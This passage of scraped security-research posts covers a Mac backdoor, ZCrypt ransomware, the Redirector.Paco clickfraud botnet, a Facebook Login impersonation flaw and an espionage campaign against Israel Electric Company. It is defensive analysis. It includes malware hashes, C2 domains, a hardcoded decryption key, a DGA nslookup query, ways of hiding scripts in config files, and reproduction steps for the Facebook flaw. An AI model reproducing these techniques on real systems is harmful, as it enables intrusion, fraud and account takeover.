• Simple packet crafter (probe firewall rule-sets and find entry points into a targeted system or network)<br />
• Connect and administer databases<br />
• Process list/Task manager (access the list of processes and applications running on the system)<br />
• Send emails with attached files</p>
<p><a href=""https://labs.bitdefender.com/wp-content/uploads/2016/07/controlpanel-1-1024x750-1.png""><img alt=""controlpanel-1-1024x750-1"" class=""alignleft size-medium wp-image-2944"" height=""220"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/07/controlpanel-1-1024x750-1-300x220.png"" width=""300"" /></a></p>
<p>&nbsp;</p>
<p style=""text-align: center;""><em>Attacker control panel </em></p>
<p>The malware uses a tool named “wacaw” to capture images and videos from built-in webcams.</p>
<p><img alt=""gallery"" class=""aligncenter wp-image-2909"" height=""439"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/07/gallery-300x220.png"" width=""600"" /></p>
<p style=""text-align: center;""><em>Gallery Panel</em></p>
<p>It also uses a daemon to grab updates and fetch files from the user’s computer or execute shell scripts.</p>
<p><strong>Pastebin Agent</strong></p>
<p>Every infected machine has a unique Tor address that the attacker uses to connect and download the malware. All the addresses are stored on pastebin.com using this agent, after being encrypted with a public key using RSA and base64 algorithms.</p>
<p><strong>Consequences</strong></p>
<p>“This type of malware is particularly dangerous as it’s hard to detect and offers the attacker full control of the compromised system,” says Tiberius Axinte, Technical Leader, Bitdefender Antimalware Lab. “For instance, someone can lock you out of your laptop, threaten to blackmail you to restore your private files or transform your laptop into a botnet to attack other devices. The possibilities are endless.”</p>
<p>This app is not digitally signed by Apple. As a good safety precaution, Bitdefender recommends downloading applications exclusively from reputable websites, and using <a href=""http://www.bitdefender.com/solutions/antivirus-for-mac.html"">a security solution for Apple devices </a>to fend off Mac-targeting malware and other specific threats.</p>
<p>[<a href=""https://labs.bitdefender.com/wp-content/uploads/2016/07/Backdoor-MAC-Eleanor_final.pdf"">Read the full report here</a>]</p>
<p><em>Technical analysis was provided by Tiberius Axinte, Technical Leader at Bitdefender Antimalware Lab and Dragos Gavrilut, Antimalware Research Manager.</em></p>",https://labs.bitdefender.com/2016/07/new-mac-backdoor-nukes-os-x-systems/
Pacifier APT – two years and counting,"<p>Bitdefender researchers Marius Tivadar, Cristian Istrate, Iulian Muntean and Andrei Ardelean dissected some malware samples which had been used in the Pacifier APT spear phishing campaign over the past two years. These samples show clear evolution over time, both in terms of functionality and of stealth, proof of active development efforts.</p>
<p>The results of their work, IoCs included, can be found <a href=""http://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender-Whitepaper-PAC-A4-en_EN1.pdf"">here</a>. The APT is still under analysis, so expect updates in the following days/weeks.</p>",https://labs.bitdefender.com/2016/07/pacifier-apt-two-years-and-counting/
Bitdefender Stops ZCrypt Worm-Like Ransomware,"<p style=""text-align: left;"">Bitdefender detects and blocks a new type of ransomware that replicates itself on removable and network drives. The sample analyzed by our researchers has worm-like capabilities &#8211; it can spread via autorun.inf files on USB drives. When an infected USB is plugged into a system, ZCrypt automatically launches a file called invoice.exe, which, once opened, infects the system with ransomware.</p>
<p style=""text-align: left;"">ZCrypt first corrupts the files and then encrypts them to limit the ability of victims to use disk recovery tools. User files with the following extensions are affected:</p>
<p style=""text-align: left;"">.zip   .7z .mp4    .avi    .mkv    .wmv    .swf    .pdf  .sql    .txt    .jpeg   .jpg    .png    .bmp    .psd    .doc    .docx .rtf    .xls    .xlsx   .odt    .ppt    .pptx   .ai .xml    .c  .cpp  .asm    .js .php    .cs .aspx   .html   .conf   .sln    .mdb    asp .3fr    .accdb  .arw    .bay    .cdr    .cer    .cr2    .crt    .crw   .dbf    .dcr    .der    .dng    .dwg    .dxf    .dxg    .eps    .erf   .indd   .kdc    .mdf    .mef    .mrw    .nef    .nrw    .odb    .odp   .ods    .orf    .p12    .p7b    .p7c    .pdd    .pef    .pem    .pfx   .pst    .ptx    .r3d    .raf    .raw    .rw2    .rwl    .srf    .srw   .wb2    .wpd    .jnt    .pub    .trc    .gz .tar    .jsp    .pl .py .rb .mpeg   .msg    .log    .vob    .max    .3ds    .3dm    .db .cgi   .jar    .class  .java   .bak    .pdb    .apk    .sav    .cbr    .pkg   .tar. gz. fla.    .h  .sh .vb .vcxproj  .XCODEPROJ  .eml    .emlx  .mbx   .vcf</p>
<p style=""text-align: left;"">The original file will be deleted and the encrypted files will have the .zcrypt extension. A ransom note will be created with the following name &#8220;How to decrypt files.html&#8221;</p>
<p style=""text-align: left;""><img alt=""Untitled2"" class=""alignnone size-medium wp-image-2883"" height=""296"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/06/Untitled2-300x296.png"" width=""300"" /></p>
<p style=""text-align: left;"">To ensure persistence, the malware will create the following registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\zcrypt, which will point to  itself, and also a shortcut named &#8220;zcrypt.lnk&#8221; in the startup folder.</p>
<p style=""text-align: left;"">Interestingly, ZCrypt uses an old, yet effective technique. Introduced back in the Windows XP era to facilitate software installations from CD-ROM media for non-technical computer users, the Autorun feature has rapidly become the infection vector of choice for cyber-criminals. For years, Autorun-based malware has been atop of the worldwide e-threat landscape, with notorious representatives such as Trojan.AutorunInf, the Conficker worm (Win32.Worm.Downadup) or Worm.Autorun.VHD.</p>
<p style=""text-align: left;"">Bitdefender has a solution &#8211; the USB Immunizer disables autorun-related threats before they access the computer. Once installed, it constantly watches for newly inserted USB storage devices and immunizes them on the fly. If you accidentally plug in an infected USB drive that has not been immunized, the computer will not auto-execute the piece of malware located on the USB storage device.</p>
<p style=""text-align: left;"">Read more and download Bitdefender&#8217;s USB Immunizer <a href=""https://labs.bitdefender.com/2012/04/immunizer-v3-launched/"">here.</a></p>
<p style=""text-align: left;"">Bitdefender detects this threat as  Gen:Variant.ZCrypt.1.</p>
<p style=""text-align: left;"">MD5: 62bf8f83071452af96a37e0ed0159731</p>",https://labs.bitdefender.com/2016/06/bitdefender-stops-zcrypt-worm-like-ransomware/
TeLeScope unveiled at Hack In the Box,"<p>Bitdefender vulnerability researcher Radu Caragea presented today at the <a href=""https://conference.hitb.org/hitbsecconf2016ams/sessions/telescope-peering-into-the-depths-of-tls-traffic-in-real-time/"">Hack In The Box Amsterdam conference</a> a novel way to extract TLS keys from virtual machines, using an out-of-guest approach. The new technique works to detect the creation of TLS session keys in memory as the virtual machine is running.<br />
<span id=""more-2865""></span></p>
<div class=""wp-caption alignnone"" style=""width: 610px;""><a href=""http://www.bitdefender.com/images/telescope-unveiled-at-hack-in-the-box.jpg""><img class="""" height=""350"" src=""http://www.bitdefender.com/images/telescope-unveiled-at-hack-in-the-box.jpg"" width=""600"" /></a><p class=""wp-caption-text"">Photo: Bitdefender Researcher, Radu Caragea</p></div>
<p>The presentation covers a novel technique that not only works for virtualized machines but is also OS-agnostic and crypto-library-agnostic. With a minimal overhead both in terms of speed and in terms of setup, this new technique offers insight into dynamic malware analysis of infected machines.</p>
<p>For further details, the presentation will be available [<a href=""https://conference.hitb.org/hitbsecconf2016ams/materials/"">here</a>].</p>",https://labs.bitdefender.com/2016/05/telescope-unveiled-at-hack-in-the-box/
Inside The Million-Machine Clickfraud Botnet,"<p>Online advertising is a multi-billion dollar business mostly ran by Google, Yahoo or Bing via AdSense-like programs. The current generation of clickbots such as the Redirector.Paco Trojan have taken abuse to a whole new level, burning through companies&#8217; advertising budget at an unprecedented pace.</p>
<p><span id=""more-2834""></span></p>
<p><em>This paper is based on research carried by Bitdefender antimalware researchers Cristina Vatamanu, Răzvan Benchea and Alexandru Maximciuc.</em></p>
<p><strong>How it works</strong></p>
<p>The malware’s objective is to redirect all traffic performed when using a popular search engine (such as Google, Yahoo or Bing) and replace the results with others obtained from a Google custom search. The goal is to help cyber-criminals earn money from the AdSense program.</p>
<p>Google&#8217;s AdSense for Search program places contextually relevant ads on Custom Search Engine&#8217;s search results pages and shares a portion of its advertising revenue with AdSense partners.</p>
<p>To redirect the traffic the malware performs a few simple registry tweaks. It modifies the “AutoConfigURL” and “AutoConfigProxy” values from the “Internet Settings” registry key so that for every request that a user makes, a PAC (Proxy auto-config) file will be queried. This file tells the browser to redirect the traffic to a different address.</p>
<p>The malware tries to make the search results look authentic. However, there are some markers that would normally raise suspicions.</p>
<p>In the status bar of the browser, messages like “Waiting for proxy tunnel” or “Downloading proxy script” may be displayed. Secondly, the Google page takes abnormally long to load. Furthermore, the malware doesn’t show the typical yellow ‘o’ characters above the page numbers.</p>
<p><img alt=""search"" class=""alignnone wp-image-2835"" height=""151"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/search.png"" width=""600"" /></p>
<p>Redirector.Paco has been active in the wild starting mid-september 2014. During this period it has managed to infect more than 900000 IPs worldwide, mainly from India, Malaysia, Greece USA, Italy, Pakistan, Brazil and Algeria.</p>
<p><img alt=""serch-map"" class=""alignnone wp-image-2836"" height=""417"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/serch-map-1024x712.png"" width=""600"" /></p>
<p><strong>MSI type</strong><br />
The malicious infection chain starts with a modified MSI file. The installation files usually belong to known benign programs such as “WinRAR 5.2 msi”, “WinRAR 5.11”, “YouTube Downloader 1.0.1”, “WinRAR 5.11 Final”, “&#8221;Connectify 1.0.1”, “Stardock Start8 1.0.1”, “KMSPico 9.3.3”. The installation files are modified using Advanced Installer[1] [2] .[3]</p>
<p>In one of the versions analyzed, three additional files were added to the installation file: “prefs.js”, “reset.txt” and “update.txt”. As seen in the image below, the “prefs.js” file will be dropped in %programfiles% while “reset.txt” and “update.txt” will be dropped in %commonprogramfiles%.</p>
<p><img alt=""tables-1"" class=""alignnone wp-image-2837 size-full"" height=""165"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/tables-1.png"" width=""593"" /></p>
<p>In addition to these, two scheduled tasks are also added in order to assure persistence on the system.</p>
<p><img alt=""tables-2"" class=""alignnone wp-image-2838"" height=""115"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/tables-2.png"" width=""600"" /></p>
<p>The Scheduled tasks, named “Adobe Flash Scheduler” and “Adobe Flash Update” will start the files dropped in the %commonprogramfiles% folder. The ““Adobe Flash Scheduler” task will execute the “update.txt” file using VBScript each time a user logs on, while “Adobe Flash Update” will execute “reset.txt” in the same way, but only on Tuesdays at 6:00 PM.</p>
<p><img alt=""task-sched"" class=""alignnone wp-image-2839"" height=""90"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/task-sched.png"" width=""600"" /></p>
<p><strong>1. The Scripts</strong></p>
<p>Reset.txt, comprised of nine lines of text and an additional 164 blank lines at the beginning, modifies the Internet Settings for the current user.</p>
<p><img alt=""reset-txt"" class=""alignnone wp-image-2840"" height=""357"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/reset-txt.png"" width=""600"" /></p>
<p>It first deactivates the proxy cache by setting the value “EnableAutoProxyResultCache” to 0 from the key “HKCU\Software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings”. Afterwards, it modifies the following four values. The main purpose is to make the browser download and use the proxy auto-configuration file identified by the URL “http://wp[redacted].com.gr/server.pac”.</p>
<p><img alt=""registry"" class=""alignnone wp-image-2841"" height=""217"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/registry.png"" width=""600"" /></p>
<p>The content of the PAC file:</p>
<p><img alt=""serrver.pac"" class=""alignnone size-full wp-image-2842"" height=""321"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/serrver.pac_.png"" width=""566"" /></p>
<p>As shown, any request to any page that starts with https://www.google or https://cse.google will be redirected to the IP 93.*.*.240 on port 8484. However, at this point, since the requests are made on the HTTPS protocol, they will be accompanied by a warning that alerts the user that there is a problem with the certificate.</p>
<p><a href=""https://labs.bitdefender.com/wp-content/uploads/2016/05/cetrificate-error.png""><img alt=""cetrificate-error"" class=""alignnone wp-image-2843"" height=""417"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/cetrificate-error.png"" width=""600"" /></a></p>
<p>This is where update.txt comes in use.</p>
<p><img alt=""update.txt"" class=""alignnone wp-image-2844"" height=""223"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/update.txt.png"" width=""600"" /></p>
<p>Update.txt downloads and installs a root certificate so that any connection that goes through the server specified in the PAC file looks private. As displayed in the image below, the icon for the HTTPS protocol remains unaltered, so the user doesn’t get suspicious. However, if he checks the certificate, he can observe that it was issued by DO_NOT_TRUST_FiddlerRoot.</p>
<p><img alt=""google-certificate"" class=""alignnone wp-image-2845"" height=""416"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/google-certificate.png"" width=""600"" /></p>
<p><strong>2. JavaScript file</strong><br />
The malware also contains JavaScript files similar in behavior to update.txt and reset.txt files. The script is given below.</p>
<p><img alt=""js.capture"" class=""alignnone wp-image-2846"" height=""215"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/js.capture-1024x367.png"" width=""600"" /></p>
<p>The script first queries the “text” record from the DNS server for remotesettings1.mtmyoq.se. This returns the following output.</p>
<p><img alt=""cmd-snip"" class=""alignnone wp-image-2847"" height=""99"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/cmd-snip.png"" width=""600"" /></p>
<p>The text record contains two URLS, splitted by the character “|”.</p>
<p>The first one points to the PAC file, while the second is the certificate that will be used in order to avoid the issuing of alerts when HTTPS is used for browsing. The URL that will be stored in registry is “http://localhost.[redacted]/localhost.local”.</p>
<p>Other variants of the same scripts were spotted in the wild. For example, a variant of this script was made to look like a PDF file. This was achieved by using markers specific to PDF files as well as parts from a PDF file as comments for the JavaScript.</p>
<p><img alt=""pac-file"" class=""alignnone wp-image-2848"" height=""274"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/pac-file.png"" width=""600"" /></p>
<p>Another variant of the JavaScript was made to look like a ini file. In fact we have found two versions of this kind of file. In the first case, the whole JavaScript was written as a single line and was appended to a line located in the middle of the original file. A great amount of blank spaces were also inserted between the original line and the JavaScript code to hide it in case someone was checking the file with a text editor that doesn’t have word wrap enabled.</p>
<p><img alt=""js.capture-2"" class=""alignnone wp-image-2849"" height=""376"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/js.capture-2.png"" width=""600"" /></p>
<p>In another version, the same JavaScript was broken and pieces were inserted at random positions in a configuration file. Unless someone views this file with an editor that has syntax highlighting is very hard to spot the malicious code.</p>
<p><img alt=""js.capture-3"" class=""alignnone wp-image-2850"" height=""231"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/js.capture-3.png"" width=""600"" /></p>
<p>.Net Type<br />
This component of the malware modifies the search results locally and not through the use of an external server, as previous ones. For this to be accomplished, the malware performs a man-in-the-middle attack, as described below:</p>
<p>&nbsp;</p>
<p>1.    Tries to contact a server every 5 seconds in order to receive the URLs  to redirect</p>
<p>2.    Modifies the registry settings in order to redirect some requests to the local system</p>
<p>3.    Starts a server on the local system to receive the redirected requests and modify them</p>
<p>4.    Checks for updates</p>
<p>A piece of code describing the steps:</p>
<p><img alt=""net-code"" class=""alignnone wp-image-2851"" height=""304"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/net-code.png"" width=""600"" /></p>
<p>In order to contact the server, the malware has integrated a simple DGA. A list of domains is generated based on a fix seed. The TLDs for these domains is ‘se’. In addition a number is prepended at the beginning of the string. It represents a counter, starting with the value 1, and is incremented until a condition is satisfied.</p>
<p><img alt=""net-code-2"" class=""alignnone wp-image-2852"" height=""118"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/net-code-2.png"" width=""600"" /></p>
<p><img alt=""domains"" class=""alignnone wp-image-2853 size-full"" height=""166"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/domains.png"" width=""538"" /></p>
<p>As it can be observed, the first generated domain, 1.m[redacted]q.se is the one found in the JavaScript file.</p>
<p>These binary files will iterate through the list of generated domains and will perform a nslookup operation in order to retrieve the txt record of each domain.</p>
<p><em>Example:</em><br />
<em>nslookup -type=txt 1.m[redacted]q.se</em></p>
<p>In contrast to the JavaScript file, the responses are encrypted using base64 and rijndael algorithms. The setup for the rijndael algorithm is:</p>
<p><em>rijndaelManaged.Padding = PaddingMode.PKCS7;</em></p>
<p><em>rijndaelManaged.Mode = CipherMode.CBC;</em></p>
<p><em>rijndaelManaged.KeySize = 256;</em></p>
<p><em>rijndaelManaged.BlockSize = 256;</em></p>
<p><em>rijndaelManaged.Key = uTF8Encoding.GetBytes(“anjueolkdiwpoida”);</em></p>
<p><em>rijndaelManaged.IV= uTF8Encoding.GetBytes(“45287112549354892144548565456541”);</em></p>
<p>After applying the decryption algorithm, the following xml is revealed:</p>
<p><img alt=""xml"" class=""alignnone wp-image-2854"" height=""291"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/xml.png"" width=""600"" /></p>
<p>The &lt;PacFile&gt; tag contains the ‘server.pac’ functionality. In this case, all searches performed on the three most popular search engines (Google, Bing and Yahoo) are going to be redirected to the local system on the port 8080, where a man-in-the-middle server listens.</p>
<p><img alt=""pacfile"" class=""alignnone wp-image-2855 size-full"" height=""93"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/pacfile.png"" width=""594"" /></p>
<p>After the PAC file is retrieved, the user’s Internet Settings are adjusted so that the browser will query the PAC file. The steps are similar to the ones performed by the JavaScript file, yet the PAC file will not be retrieved from an external server, but from a HTTP server listening on port 9090 on the local system.</p>
<p><img alt=""pacfile-2"" class=""alignnone wp-image-2856"" height=""231"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/pacfile-2-1024x395.png"" width=""600"" /></p>
<p>Once the browser is configured, the malware starts the man-in-the-middle service, as well as the HTTP server that will provide the PAC file to the browser.</p>
<p>For the main-in-the-middle proxy, the malware relies on the FiddlerCore, a .NET class library that allows the capturing and alteration of HTTP and HTTPS traffic. The Fiddler service is configured to run on port 8080, to ignore certificate errors, as well as to modify HTTP headers, the HTTP response and body.</p>
<p>The redirection can be performed either by returning the 302 response code or by replacing the keyword “/search” with “/cse?cx=”.</p>
<p><img alt=""pacfile-3"" class=""alignnone wp-image-2857"" height=""207"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/05/pacfile-3-1024x353.png"" width=""600"" /></p>
<p>Also, to overcome certificate errors, a new root certificate is added using the CertMaker class from the FiddlerCore library.</p>
<p>At the final stage, a check for updates is performed. From the initial setting XML, the update URL is retrieved (http://search[hidden].org/update.php) and an executable file is downloaded in the %temp% folder (if the current version is different from the one in the XML file).</p>
<p>&nbsp;</p>
<p><strong>MD5 hashes  of analyzed samples throughout this paper:</strong><br />
0681d610f382f5aa59e69d976ed7acdb</p>
<p>10fca73594868fd485be04bff65aced8</p>
<p>22aafceaf916d0e4bc41f86b3e88f823</p>
<p>29de111df1983e169959dca011721e1b</p>
<p>387c228de33429edb68ae4c766525bfa</p>
<p>3943bc3e0cf71334bb2e996452507d53</p>
<p>4058fffb19b7d72b4ab89934c80e93e8</p>
<p>4f19bb0b2f343c2bcc25fe36bccbbab7</p>
<p>521ac14c9aae6cac9b988dd4dd6a2f6b</p>
<p>5dd5153f292147f7dfa63d3fdbecde45</p>
<p>6a2ac9046e8632e00d52bfb804ddeb5e</p>
<p>713dc2ca729aad773380c6fca70af8b7</p>
<p>84c2eb6006a68a18380525ca01adcb53</p>
<p>8f93e41c30911fd2321973c01277c752</p>
<p>99a0df95986f975a4e5229550d710f23</p>
<p>9f7f337257c8b90e75355483dacbd0c8</p>
<p>b29816a16f6ac75432d52848236c04db</p>
<p>b5b98837ede4701a98f1467ab53160fb</p>
<p>bd2d150a810541d4e8af07d40c6c2d9e</p>
<p>bfe9796d943966d05b7a7fb57cc6e595</p>
<p>c6b90576c2f6aae51fc932c98b17daf0</p>
<p>d62b97f57093cc5cb4d1fd3cff89f63b</p>
<p>e13911d77eaed1f495c78757f0790033</p>
<p>eed81f2283c05191c77ceec6ecf989bc</p>
<p>f9db0d4abe8486186ca21466750dfbd8</p>
<p>fef9c06700c1aa40a467d2da56a08ead</p>
<p><strong>Custom searches used:</strong></p>
<p>008492270633049060610:wwrnggf2czw</p>
<p>017628126614017098810:c2rlwcsnsbe</p>
<p>009793234822822480237:wabrdd_t6e8</p>",https://labs.bitdefender.com/2016/05/inside-the-million-machine-clickfraud-botnet/
Attackers Pose as Account Owners via Facebook Login Flaw,"<p style=""text-align: justify;"">Facebook vulnerability breaks down the convenience of social login authentication.  Insufficient security validation allows attackers to impersonate Internet users and gain password-less access to any of their online accounts.<span id=""more-2820""></span></p>
<p style=""text-align: justify;"">Social logins are an alternative to traditional authentication. They offer users a convenient way to sign in to their web accounts without entering their username and password. Most websites offer social login through Facebook, LinkedIn, Twitter or Google Plus. Bitdefender researchers found a way to steal a user’s identity and gain access to his web accounts using Facebook’s Login plugin.</p>
<p style=""text-align: justify;""><em>“This is a serious vulnerability – it allows attackers to login on most websites that feature Facebook Login,”</em> Ionut Cernica, Bitdefender vulnerability researcher says.<em> “This means an attacker can make payments on the user’s behalf on an e-commerce site, for instance.”</em></p>
<p style=""text-align: justify;"">For the attack to succeed, the email address of the victim must not be registered on Facebook. As we know, most internet users have more than one e-mail address published on different websites and thus, publicly available. It’s simple enough for the attacker to get one of these addresses and register a Facebook account with it.</p>
<p style=""text-align: justify;"">To verify the identity of a user without exposing his credentials, Login with Facebook uses the OAuth protocol.  Through OAuth, Facebook is authorized to share some user information with the third-party website.</p>
<p style=""text-align: justify;""><strong>How the spoofing is done</strong></p>
<p style=""text-align: justify;"">The researcher managed to bypass the confirmation step typically required when registering a new Facebook email address.</p>
<p style=""text-align: justify;"">He created a Facebook account with the victim’s email address.</p>
<p style=""text-align: justify;""><img alt=""Attackers Pose as Account Owners via Facebook Login Flaw"" class=""aligncenter wp-image-2821"" height=""400"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/04/attackers-pose-as-account-owners-via-facebook-login-flaw-1.png"" width=""344"" /></p>
<p style=""text-align: justify;""><em>Fig. 1 Attacker creates new Facebook account with victim email address</em></p>
<p style=""text-align: justify;"">During registration, he swapped the email address for one he controlled.</p>
<p style=""text-align: justify;""><img alt=""Attackers Pose as Account Owners via Facebook Login Flaw"" class=""alignnone wp-image-2822"" height=""429"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/04/attackers-pose-as-account-owners-via-facebook-login-flaw-2.png"" width=""600"" /></p>
<p style=""text-align: justify;""><em>Fig. 2 Attacker changes victim email address with his own</em></p>
<p style=""text-align: justify;"">After refreshing the page, it looked like the victim’s email address had also been validated.</p>
<p style=""text-align: justify;"">When he tried to sign in via the “Facebook Login” button &#8211; with the victim’s email address &#8211; on another website, he was asked to confirm his own email address, not the victim’s.</p>
<p style=""text-align: justify;""><img alt=""Attackers Pose as Account Owners via Facebook Login Flaw"" class=""alignnone wp-image-2823"" height=""343"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/04/attackers-pose-as-account-owners-via-facebook-login-flaw-3.png"" width=""600"" /></p>
<p style=""text-align: justify;""><em>Fig. 3 Attacker is asked to confirm own email address</em></p>
<p style=""text-align: justify;"">Under account settings in Facebook, the victim’s address was the primary contact, even though the researcher only confirmed his personal account.</p>
<p style=""text-align: justify;""><em>“I used Facebook Login again and decided to switch the primary contact from the victim’s address to mine, then switch them again to make the victim account as the primary account. This is an important step to reproduce the issue,” </em>Ionut added.</p>
<p style=""text-align: justify;""><img alt=""Attackers Pose as Account Owners via Facebook Login Flaw"" class=""alignnone wp-image-2824"" height=""407"" src=""https://labs.bitdefender.com/wp-content/uploads/2016/04/attackers-pose-as-account-owners-via-facebook-login-flaw-4.png"" width=""600"" /></p>
<p style=""text-align: justify;""><em>Fig. 4 Attackers sets victim’s email address as primary contact</em></p>
<p style=""text-align: justify;"">On another website, he used “Facebook Login” to successfully authenticate as the victim. The site matched the email address of the victim &#8211; passed to it by Facebook &#8211; to the existing account and allowed the attacker to control the account.</p>
<p style=""text-align: justify;""><em>“The identity provider – in this case, Facebook – should wait until the email address has been verified,” </em>Ionut says.</p>
<p style=""text-align: justify;"">Facebook fixed the vulnerability after notification from the Bitdefender security researcher.</p>",https://labs.bitdefender.com/2016/04/attackers-pose-as-account-owners-via-facebook-login-flaw/
Operation Electric Powder – Who is targeting Israel Electric Company?,"<p><strong>Attackers have been trying to breach IEC (Israel Electric Company) in a year-long campaign.</strong></p>
<p>From April 2016 until at least February 2017,  attackers have been spreading malware via fake Facebook profiles and pages, breached websites, self-hosted and cloud based websites. Various artifacts indicate that the main target of this campaign is IEC &#8211; Israel Electric Company. These include domains, file names, Java package names,  and Facebook activity. We dubbed this campaign &#8220;<strong>Operation Electric Powder</strong>&#8220;<strong>.</strong></p>
<p><a href=""https://en.wikipedia.org/wiki/Israel_Electric_Corporation"">Israel Electric Company</a> (also known as Israel Electric Corporation) &#8220;is the largest supplier of electrical power in Israel. The IEC builds, maintains, and operates power generation stations, sub-stations, as well as transmission and distribution networks. The company is the sole integrated electric utility in the State of Israel. It installed generating capacity represents about 75% of the total electricity production capacity in the country.&#8221;</p>
<p>It is notable that the operational level and the technological sophistication of the attackers are not high. Also, they are having hard time preparing decoy documents and websites in Hebrew and English. Therefore, in most cases a vigilant target should be able to notice the attack and avoid infection. We do not have indication that the attacks succeeded in infecting IEC related computers or stealing information.</p>
<p>Currently we do not know who is behind Operation Electric Powder or what its objectives are. See further discussion in the <a href=""http://www.clearskysec.com/feed/#att123"">Attribution </a>section.</p>
<h2>Impersonating Israeli news site</h2>
<p>The attackers registered and used in multiple attacks the domain <em>ynetnew<strong>e</strong>s[.]com</em> (note the extra e). This domain impersonates ynetnews.com, the English version of ynet.co.il &#8211; one of Israel&#8217;s most popular news sites.</p>
<p>Certain pages within the domain would load the legitimate Ynet website:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/ynet-redirect.png""><img alt="""" class=""aligncenter wp-image-1617"" height=""365"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/ynet-redirect.png"" width=""550"" /></a></p>
<p>Others, which are opened as decoy during malware infection, had copied content from a different news site:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/ynetnewes-1.jpg""><img alt="""" class=""wp-image-1659 aligncenter"" height=""335"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/ynetnewes-1.jpg"" width=""386"" /></a></p>
<p>The URL <em>ynetnewes[.]com/video/Newfilm.html</em> contained an article about Brad Pitt and Marion Cotillard <a href=""http://www.nrg.co.il/online/47/ART2/830/912.html"">copied from another site</a>. At the bottom was a link saying &#8220;Here For Watch It !&#8221;:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/ynetnewes.jpg""><img alt="""" class=""aligncenter wp-image-1614 "" height=""307"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/ynetnewes.jpg"" width=""549"" /></a></p>
<p>The link pointed to goo[.]gl/zxhJxu (Google&#8217;s URL shortening service). According to the <a href=""https://goo.gl/#analytics/goo.gl/zxhJxu/all_time"">statistics page</a>, it had been created on September 25, 2016 and have been clicked only 11 times. When clicked, it would redirect to <em>iecr[.]co/info/index_info.php .</em></p>
<p>We do not know what was the content in the final URL. We estimate that it served malware. The domain iecr[.]co was used as a command and control server for other malware in this campaign.</p>
<p>Another URL,   <em>http://ynetnewes[.]com/resources/assets/downloads/svchost.exe</em></p>
<p>hosted a malware file called program_stream_film_for_watch.exe.<br />
(<a href=""https://www.virustotal.com/en/file/6909674a3af0960675ca6184d890e0b294da4c66b9e512b35112474f58a4c900/analysis/"">d020b08f5a6aef1f1072133d11f919f8</a>)</p>
<h2>Fake Facebook profile &#8211; Linda Santos</h2>
<p>One of the above mentioned malicious URLs was spread via comments by a fake Facebook profile &#8211; Linda Santos (<a href=""https://www.facebook.com/profile.php?id=100012012675632"">no longer available</a>):</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/Linda-santos.png""><img alt="""" class=""wp-image-1637 aligncenter"" height=""250"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/Linda-santos.png"" width=""442"" /></a></p>
<p>In September 2016, the fake profile commented to posts by Israel Electric Company:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/iec-comment.png""><img alt="""" class=""wp-image-1616 aligncenter"" height=""523"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/iec-comment.png"" width=""380"" /></a></p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/Picture1.png""><img alt="""" class=""wp-image-1640 aligncenter"" height=""524"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/Picture1.png"" width=""378"" /></a></p>
<p>The profile had dozens of friends, almost all were IEC employees:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/IEC2.jpg""><img alt="""" class=""alignnone wp-image-1720 size-full"" height=""519"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/IEC2.jpg"" width=""1001"" /></a></p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/iec-friends.jpg""><img alt="""" class=""wp-image-1621 aligncenter"" height=""268"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/iec-friends.jpg"" width=""470"" /></a></p>
<p>The fake profile was following only three pages, one of which was the IEC official page:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/follwing.png""><img alt="""" class=""wp-image-1620 aligncenter"" height=""171"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/follwing.png"" width=""413"" /></a></p>
<h2>Pokemon Go Facebook page</h2>
<p style=""direction: ltr;"">In July 2016, when mobile game &#8220;Pokemon Go&#8221; was at the peak of its popularity, the attackers created a Facebook page impersonating the official Pokemon Go page:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/Pokémon-Go.jpg""><img alt="""" class=""wp-image-1602 aligncenter"" height=""223"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/Pokémon-Go.jpg"" width=""460"" /></a></p>
